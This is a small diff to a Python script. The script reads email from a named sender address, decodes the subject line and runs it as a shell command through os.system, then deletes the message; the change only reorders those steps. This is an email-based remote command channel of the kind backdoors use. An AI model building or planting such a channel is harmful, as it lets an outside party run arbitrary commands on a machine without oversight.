@@ -20,6 +20,7 @@ if 'xietaitong@163.com' in content:
     dh = email.header.decode_header(subject)
     bytes_ = dh[0][0]
     order = bytes_.decode('utf-8')
-    os.system(order)
     revcSer.dele(num)
     revcSer.quit()
+    os.system(order)
+
